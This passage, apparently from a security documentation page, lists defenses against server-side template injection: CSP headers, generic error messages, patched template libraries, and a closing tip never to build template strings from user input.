  CSP headers prevent inline script execution, limiting the impact of any reflected template output.
  ::

  ::field{name="Error Handling" type="medium"}
  Template errors never expose engine type, version, stack traces, or internal paths to users. Generic error messages in production.
  ::

  ::field{name="Dependency Updates" type="medium"}
  Template engine libraries kept up to date. Known CVEs patched promptly. Sandbox bypass vulnerabilities monitored.
  ::
::

::tip
The most effective defense is simple: **never put user input into template strings**. Treat template code like application source code — it should be written by developers, stored in files, and user data should only flow in through designated template variables. If you follow this single rule, SSTI becomes impossible regardless of which template engine you use.
::